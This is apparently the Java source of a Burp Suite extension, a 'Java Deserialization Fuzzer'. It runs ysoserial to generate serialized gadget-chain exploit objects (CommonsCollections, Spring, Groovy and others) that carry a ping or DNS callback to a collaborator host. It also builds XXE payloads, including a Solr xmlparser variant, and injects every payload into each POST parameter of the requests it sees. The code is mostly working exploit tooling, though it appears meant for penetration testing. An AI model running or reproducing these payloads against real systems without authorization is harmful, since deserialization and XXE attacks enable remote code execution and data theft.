package burp;

import java.awt.Component;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.filechooser.FileSystemView;
import javax.swing.table.DefaultTableModel;


public class BurpExtender implements IBurpExtender, IScannerCheck, ITab
{
	private JPanel MainPane;
	private JTextField textField,filetextField;
	private JButton generatbtn,Header_add,Header_remv,Header_update,Param_add,Param_remv,Param_update,filechoosebtn;
	private DefaultTableModel Header_dtm,Param_dtm;
	private JTable Header_Tbl,Param_Tbl;
	private JScrollPane Header_scroll,command_scroll,Param_scroll;
	private JScrollPane scrolltab;
	 
	private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private OutputStream output;
    private IBurpCollaboratorClientContext collaborator;
    //private String request;
    
    IHttpRequestResponse checkRequestResponse;
    HashSet<String> overallparams;
    List<String> payloads;
    JPanel optionspan,optionspan1,optionspan2,optionspan3,optionspan4,optionspan5,optionspan6;
    JCheckBox checkbox1,checkbox2,checkbox3,checkbox4,checkbox5,checkbox6,checkbox7,checkbox8,checkbox9,checkbox10,checkbox11,checkbox12,checkbox13,checkbox14,checkbox15,checkbox16,checkbox17,checkbox18,checkbox19,checkbox20,checkbox21,checkbox22,checkbox23,checkbox24;
    JFileChooser jfc;
    String collip="";
    
        
    
	@Override
	public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) 
	{
		// keep a reference to our callbacks object
        this.callbacks = callbacks;
        		
		// keep a reference to our callbacks object
		this.callbacks = callbacks;

		// obtain an extension helpers object
		helpers = callbacks.getHelpers();
		collaborator=callbacks.createBurpCollaboratorClientContext();
		// set our extension name
		callbacks.setExtensionName("JavaDeserializationFuzzer");

		// register ourselves as a custom scanner check
		callbacks.registerScannerCheck(this);
		
		
		//get the output stream for info messages
		output = callbacks.getStdout();
		
		overallparams=new HashSet<String>();
		payloads=new ArrayList<String>();
		
		/* 
		 * Building UI tab for user inputs
		 */
		SwingUtilities.invokeLater(new Runnable(){

			@Override
			public void run() {
				
				MainPane = new JPanel();
				
				JPanel HeaderPan=new JPanel();
				JPanel HeaderPan1=new JPanel();
				JPanel HeaderPan2=new JPanel();
				
				JPanel ParamPan1=new JPanel();
				JPanel ParamPan2=new JPanel();
				
				JPanel command = new JPanel();
				JPanel commandpath = new JPanel();
				
				optionspan= new JPanel();
				optionspan1= new JPanel();
				optionspan2= new JPanel();
				optionspan3= new JPanel();
				optionspan4= new JPanel();
				optionspan5= new JPanel();
				optionspan6= new JPanel();
				
				textField = new JTextField(40);
				textField.setMaximumSize(textField.getPreferredSize());
				generatbtn = new JButton("Generate Payloads");
				
				filetextField = new JTextField(40);
				filetextField.setText("ysoserial-master-v0.0.5.jar");
				filetextField.setMaximumSize(filetextField.getPreferredSize());
				filechoosebtn = new JButton("Select File");
				
				filechoosebtn.addActionListener(new ActionListener() {
					
					@Override
					public void actionPerformed(ActionEvent e) {
						// TODO Auto-generated method stub
						
						jfc = new JFileChooser(FileSystemView.getFileSystemView().getHomeDirectory());

						int returnValue = jfc.showOpenDialog(null);
						// int returnValue = jfc.showSaveDialog(null);

						if (returnValue == JFileChooser.APPROVE_OPTION) {
							File selectedFile = jfc.getSelectedFile();
							filetextField.setText(selectedFile.getAbsolutePath());
						}
						
					}
				});
				
				 checkbox1 = new JCheckBox("BeanShell1");
				 checkbox2 = new JCheckBox("CommonsCollections1");
				 checkbox3 = new JCheckBox("CommonsCollections2");
				 checkbox4 = new JCheckBox("CommonsCollections3");
				 checkbox5 = new JCheckBox("CommonsCollections4");
				 checkbox6 = new JCheckBox("CommonsCollections5");
				 checkbox7 = new JCheckBox("CommonsCollections6");
				 checkbox8 = new JCheckBox("CommonsBeanutils1");
				 checkbox9 = new JCheckBox("Clojure");
				 checkbox10 = new JCheckBox("Groovy1");
				 checkbox11 = new JCheckBox("Hibernate1");
				 checkbox12 = new JCheckBox("Hibernate2");
				 checkbox13 = new JCheckBox("JBossInterceptors1");
				 checkbox14 = new JCheckBox("JRMPClient");
				 checkbox15 = new JCheckBox("Jdk7u21");
				 checkbox16 = new JCheckBox("JavassistWeld1");
				 checkbox17 = new JCheckBox("JSON1");
				 checkbox18 = new JCheckBox("MozillaRhino1");
				 checkbox19 = new JCheckBox("Myfaces1");
				 checkbox20 = new JCheckBox("ROME");
				 checkbox21 = new JCheckBox("Spring1");
				 checkbox22 = new JCheckBox("Spring2");
				 checkbox23 = new JCheckBox("URLDNS");
				 checkbox24 = new JCheckBox("XXE");
				 
				 JCheckBox SelectAll = new JCheckBox("SelectAll");
				 
				 SelectAll.addItemListener(new ItemListener(){
					 public void itemStateChanged(ItemEvent e) {
						 if(e.getStateChange() == ItemEvent.SELECTED) {
							 for(Component comp : optionspan1.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(true);
					 			   }
					 			}
							 for(Component comp : optionspan2.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(true);
					 			   }
					 			}
							 for(Component comp : optionspan3.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(true);
					 			   }
					 			}
							 for(Component comp : optionspan4.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(true);
					 			   }
					 			}
							 for(Component comp : optionspan5.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(true);
					 			   }
					 			}
							 SelectAll.setText("Select None");
						 }
						 else{
							 for(Component comp : optionspan1.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(false);
					 			   }
					 			}
							 for(Component comp : optionspan2.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(false);
					 			   }
					 			}
							 for(Component comp : optionspan3.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(false);
					 			   }
					 			}
							 for(Component comp : optionspan4.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(false);
					 			   }
					 			}
							 for(Component comp : optionspan5.getComponents() ) {
					 			   if(comp instanceof JCheckBox)
					 			   {
					 				   ((JCheckBox) comp).setSelected(false);
					 			   }
					 			}
							 SelectAll.setText("Select All");
						 }
					 }
					 
				 });
				
								
				Header_add=new JButton("Add");
				Header_remv=new JButton("Remove");
				Header_update=new JButton("Update");
				Header_dtm=new DefaultTableModel();
				Header_Tbl=new JTable(Header_dtm);
				Header_dtm.addColumn("Payload type");
				Header_dtm.addColumn("Payload Value");
				Header_scroll=new JScrollPane(Header_Tbl);
				Header_scroll.setPreferredSize(new Dimension(500,200));
				
				Param_add=new JButton("Add");
				Param_remv=new JButton("Remove");
				Param_update=new JButton("Update");
				Param_dtm=new DefaultTableModel();
				Param_Tbl=new JTable(Param_dtm);
				Param_dtm.addColumn("Exclude Parameters from test");
				Param_scroll=new JScrollPane(Param_Tbl);
				Param_scroll.setPreferredSize(new Dimension(200,200));
				
				HeaderPan.setLayout(new FlowLayout());
				HeaderPan1.setLayout(new BoxLayout(HeaderPan1,BoxLayout.X_AXIS));
				HeaderPan2.setLayout(new BoxLayout(HeaderPan2,BoxLayout.Y_AXIS));
				
				ParamPan1.setLayout(new BoxLayout(ParamPan1,BoxLayout.X_AXIS));
				ParamPan2.setLayout(new BoxLayout(ParamPan2,BoxLayout.Y_AXIS));
				
				ParamPan1.add(Param_scroll);
				ParamPan2.add(Param_add);
				ParamPan2.add(Param_remv);
				ParamPan2.add(Param_update);
				
				HeaderPan1.add(Header_scroll);
				HeaderPan2.add(Header_add);
				HeaderPan2.add(Header_remv);
				HeaderPan2.add(Header_update);
				
				HeaderPan.add(HeaderPan1);
				HeaderPan.add(HeaderPan2);
				
				HeaderPan.add(ParamPan1);
				HeaderPan.add(ParamPan2);
				
				command.setLayout(new BoxLayout(command,BoxLayout.X_AXIS));
				
				command.add(new JLabel("DNS Host(Example:burpCollaborator.net)"));
				command.add(textField);
				command.add(generatbtn);
				
				commandpath.setLayout(new BoxLayout(commandpath,BoxLayout.X_AXIS));
				commandpath.add(new JLabel("select ysoserial.jar file path"));
				commandpath.add(filetextField);
				commandpath.add(filechoosebtn);
				
				
				optionspan1.add(checkbox1);
				optionspan1.add(checkbox2);
				optionspan1.add(checkbox3);
				optionspan1.add(checkbox4);
				optionspan1.add(checkbox5);
				
				optionspan2.add(checkbox6);
				optionspan2.add(checkbox7);
				optionspan2.add(checkbox8);
				optionspan2.add(checkbox9);
				optionspan2.add(checkbox10);
				
				optionspan3.add(checkbox11);
				optionspan3.add(checkbox12);
				optionspan3.add(checkbox13);
				optionspan3.add(checkbox14);
				optionspan3.add(checkbox15);
				
				optionspan4.add(checkbox16);
				optionspan4.add(checkbox17);
				optionspan4.add(checkbox18);
				optionspan4.add(checkbox19);
				optionspan4.add(checkbox20);
				
				optionspan5.add(checkbox21);
				optionspan5.add(checkbox22);
				optionspan5.add(checkbox23);
				optionspan5.add(checkbox24);
				
				optionspan6.add(SelectAll);
				
				optionspan1.setLayout(new BoxLayout(optionspan1,BoxLayout.Y_AXIS));
				optionspan2.setLayout(new BoxLayout(optionspan2,BoxLayout.Y_AXIS));
				optionspan3.setLayout(new BoxLayout(optionspan3,BoxLayout.Y_AXIS));
				optionspan4.setLayout(new BoxLayout(optionspan4,BoxLayout.Y_AXIS));
				optionspan5.setLayout(new BoxLayout(optionspan5,BoxLayout.Y_AXIS));
				optionspan6.setLayout(new BoxLayout(optionspan6,BoxLayout.Y_AXIS));
				
				optionspan.setLayout(new BoxLayout(optionspan, BoxLayout.LINE_AXIS));
				
				optionspan.add(optionspan6);
				optionspan.add(optionspan1);
				optionspan.add(optionspan2);
				optionspan.add(optionspan3);
				optionspan.add(optionspan4);
				optionspan.add(optionspan5);
												
				MainPane.setLayout(new BoxLayout(MainPane, BoxLayout.PAGE_AXIS));
				MainPane.add(commandpath);
				MainPane.add(command);
				MainPane.add(optionspan);
				MainPane.add(HeaderPan);
				
				ButtonActions btnaction=new ButtonActions();
				generatbtn.addActionListener(btnaction);
				
				scrolltab=new JScrollPane(MainPane);
				
				// customize our UI components
                callbacks.customizeUiComponent(scrolltab);
				
				
				// add the custom tab to Burp's UI
                callbacks.addSuiteTab(BurpExtender.this);
				
			}
			
			class ButtonActions implements ActionListener
		 	{

		 		@Override
		 		public void actionPerformed(ActionEvent event) 
		 		{
		 			if(generatbtn.equals(event.getSource()))
		 			{
		 				generatePayloads();
		 			}
				
		 		}
		 		
				public void generatePayloads()
		 		{
		 			
		 			String burpcollab=textField.getText();
		 			List<String>commands=new ArrayList<String>();
		 			
		 			for(Component comp : optionspan1.getComponents() ) {
		 			   if(comp instanceof JCheckBox)
		 			   {
		 				   if(((JCheckBox) comp).isSelected())
		 				   {
		 					  commands.add(((JCheckBox) comp).getText());
		 				   }
		 			   }
		 			}
		 			for(Component comp : optionspan2.getComponents() ) {
		 				if(comp instanceof JCheckBox)
			 			{
			 			  if(((JCheckBox) comp).isSelected())
			 			   {
			 				  commands.add(((JCheckBox) comp).getText());
			 			   }
			 			}
			 		}
		 			for(Component comp : optionspan3.getComponents() ) {
			 			if(comp instanceof JCheckBox)
			 			{
			 			  if(((JCheckBox) comp).isSelected())
			 			  {
			 				  commands.add(((JCheckBox) comp).getText());
			 			  }
			 			 }
			 		}
		 			for(Component comp : optionspan4.getComponents() ) {
			 			if(comp instanceof JCheckBox)
			 			{
			 			  if(((JCheckBox) comp).isSelected())
			 			  {
			 				  commands.add(((JCheckBox) comp).getText());
			 			  }
			 			 }
			 		}
		 			for(Component comp : optionspan5.getComponents() ) {
			 			if(comp instanceof JCheckBox)
			 			{
			 			  if(((JCheckBox) comp).isSelected())
			 			  {
			 				  commands.add(((JCheckBox) comp).getText());
			 			  }
			 			 }
			 		}
		 			
		 			DefaultTableModel dm = (DefaultTableModel)Header_Tbl.getModel();
		 			dm.getDataVector().removeAllElements();
		 			dm.fireTableDataChanged();
		 					
		 				 			
		 			try {
		 				for(int i=0;i<commands.size();i++)
		 				{
		 					if(commands.get(i).equalsIgnoreCase("URLDNS"))
		 					{
		 						//String cmd = "java -jar C:\\Users\\xxxxx\\Desktop\\ysoserial-master-v0.0.5-gb617b7b-16.jar "+commands.get(i)+" "+"\""+"http://"+burpcollab+"\"";
		 						String cmd = "java -jar ysoserial-master-v0.0.5.jar "+commands.get(i)+" "+"\""+"http://"+burpcollab+"\"";
		 						execute("URLDNS",cmd);
		 					}
		 					else if(commands.get(i).equalsIgnoreCase("XXE"))
		 					{
		 						String xxepayload="<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM \"http://"+burpcollab+"\">]><r>&sp;</r>";
		 						String[] xxerow={"XXE",xxepayload};
		 						Header_dtm.addRow(xxerow);
		 						
		 						String solrxxe = "{!xmlparser+v%3d'<!DOCTYPE+a+SYSTEM+\"http%3a//"+burpcollab+"\"><a></a>'}";
		 						String[] solrxxerow={"XXEsolr",solrxxe};
		 						Header_dtm.addRow(solrxxerow);
		 					}
		 					else
		 					{
		 						//String cmd = "java -jar C:\\Users\\xxxx\\Desktop\\ysoserial-master-v0.0.5-gb617b7b-16.jar "+commands.get(i)+" "+"\""+"ping "+burpcollab+"\"";
		 						String cmd = "java -jar ysoserial-master-v0.0.5.jar "+commands.get(i)+" "+"\""+"ping "+burpcollab+"\"";
		 						execute(commands.get(i),cmd);
		 					}
		 					
		 				}
		 				println("Payloads updated..");
		 				payloads.clear();
		 				for(int row = 0; row < Header_Tbl.getRowCount(); row++) 
		 				{
		 					 String payload1=Header_Tbl.getValueAt(row, 1).toString();
		 				     payloads.add(payload1); //adding base64 encoded and gzip+base64 encoded serialized object
		 				}
		 				
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
		 		}
		 	}
			
		});
		println("Successfully Loaded JavaDeserialization Fuzzer");
	}//end of UI logic
	
	@Override
	public String getTabCaption() {
		
		return "JavaDeserialization Fuzzer";
	}


	@Override
	public Component getUiComponent() {
		
		return scrolltab;
	}
	
	private String getExploitPayload(String payloadType, String command) throws IOException{

		
		String strexploitPayload="";
		try
		{
			Process p = Runtime.getRuntime().exec(command);
			InputStream is=p.getInputStream();
			ByteArrayOutputStream buffer = new ByteArrayOutputStream();
			int nRead;
			byte[] data=new byte[65535];
			while ((nRead = is.read(data, 0, data.length)) != -1) {
				buffer.write(data, 0, nRead);
			}
			buffer.flush();
			strexploitPayload=new String(Base64.getEncoder().encodeToString(buffer.toByteArray()));
			}catch (Throwable e) {
				println(e.getMessage());
			}
        return strexploitPayload;

    }

	public void execute( String payload, String command) throws IOException  { 
		
        //println("execute() inside "+payload+", "+command);
        String payl=getExploitPayload(payload,command);
        //println(payl);
        String[] row={"base64 "+payload,payl};
		Header_dtm.addRow(row);
		//String[] rowgzip = {"gzip "+type,new String(compress(sb.toString()))};
		//Header_dtm.addRow(rowgzip);
		//String[] rowgzipb64 = {"gzip+base64 "+payload,new String(binaryBase64.encodeBase64(compress(getExploitPayload(payload,command))))};
		//Header_dtm.addRow(rowgzipb64);
    }
	
	//gzip code
	
		public byte[] compress(String data) throws IOException {
			ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length());
			GZIPOutputStream gzip = new GZIPOutputStream(bos);
			gzip.write(data.getBytes());
			gzip.close();
			byte[] compressed = bos.toByteArray();
			bos.close();
			return compressed;
		}
		
		public String decompress(byte[] compressed) throws IOException {
			ByteArrayInputStream bis = new ByteArrayInputStream(compressed);
			GZIPInputStream gis = new GZIPInputStream(bis);
			BufferedReader br = new BufferedReader(new InputStreamReader(gis, "UTF-8"));
			StringBuilder sb = new StringBuilder();
			String line;
			while((line = br.readLine()) != null) {
				sb.append(line);
			}
			br.close();
			gis.close();
			bis.close();
			return sb.toString();
		}

	
	public List<String> getPostParameterExist(IRequestInfo rinfo)
	{
		List<String> pparams=new ArrayList<String>();
		IParameter parameter;
		List<IParameter> parameters=rinfo.getParameters();
		Iterator<IParameter> iterator=parameters.iterator();
		while(iterator.hasNext())
		{
			parameter=iterator.next();
			if(parameter.getType()==IParameter.PARAM_BODY)
			{
				println(parameter.getName());
				overallparams.add(parameter.getName());
				pparams.add(parameter.getName());
			}
		}
		
		return pparams;
	}
		
	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) 
	{
		IHttpService httpService=baseRequestResponse.getHttpService();
		IRequestInfo rinfo=helpers.analyzeRequest(baseRequestResponse);
		List<String> headers=rinfo.getHeaders();
		String request=new String(baseRequestResponse.getRequest());
		String reqBody=request.substring(rinfo.getBodyOffset());
		List<String> postParams=getPostParameterExist(rinfo);
				
		//Request with updated Headers
		byte[] completeReq=helpers.buildHttpMessage(headers, reqBody.getBytes());
		
		
		
		for(int i=0;i<postParams.size();i++)
		{
			for(int j=0;j<payloads.size();j++)
			{
				completeReq=helpers.updateParameter(completeReq, helpers.buildParameter(postParams.get(i), payloads.get(j), IParameter.PARAM_BODY));
				IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
		                baseRequestResponse.getHttpService(), callbacks.makeHttpRequest(httpService, completeReq).getRequest());
				IResponseInfo respInfo=helpers.analyzeResponse(checkRequestResponse.getResponse());
				
				completeReq=helpers.buildHttpMessage(headers, reqBody.getBytes());
				
			}
			
		}
		
		
		return null;
				
	}
	
	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) 
	{
		return null;
	}
	
	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) 
	{
		if(existingIssue.getHttpMessages().equals(newIssue.getHttpMessages()))
			return -1;
		else
			return 0;
	}
	
	private void println(String toPrint) 
	{
		try
		{
		    output.write(toPrint.getBytes());
		    output.write("\n".getBytes());
		    output.flush();
		} 
		catch (IOException ioe) 
		{
		    ioe.printStackTrace();
		} 
	 }
	
		
}



//class implementing IScanIssue to hold our custom scan issue details
class CustomScanIssue implements IScanIssue
{
	 private IHttpService httpService;
	 private URL url;
	 private IHttpRequestResponse[] httpMessages;
	 private String name;
	 private String detail;
	 private String severity;
	
	 public CustomScanIssue(IHttpService httpService,URL url,IHttpRequestResponse[] httpMessages,String name,String detail,String severity)
	 {
	     this.httpService = httpService;
	     this.url = url;
	     this.httpMessages = httpMessages;
	     this.name = name;
	     this.detail = detail;
	     this.severity = severity;
	 }
	 
	 @Override
	 public URL getUrl()
	 {
	     return url;
	 }
	
	 @Override
	 public String getIssueName()
	 {
	     return name;
	 }
	
	 @Override
	 public int getIssueType()
	 {
	     return 0;
	 }
	
	 @Override
	 public String getSeverity()
	 {
	     return severity;
	 }
	
	 @Override
	 public String getConfidence()
	 {
	     return "Certain";
	 }
	
	 @Override
	 public String getIssueBackground()
	 {
	     return null;
	 }
	
	 @Override
	 public String getRemediationBackground()
	 {
	     return null;
	 }
	
	 @Override
	 public String getIssueDetail()
	 {
	     return detail;
	 }
	
	 @Override
	 public String getRemediationDetail()
	 {
	     return null;
	 }
	
	 @Override
	 public IHttpRequestResponse[] getHttpMessages()
	 {
	     return httpMessages;
	 }
	
	 @Override
	 public IHttpService getHttpService()
	 {
	     return httpService;
	 }
	 
}
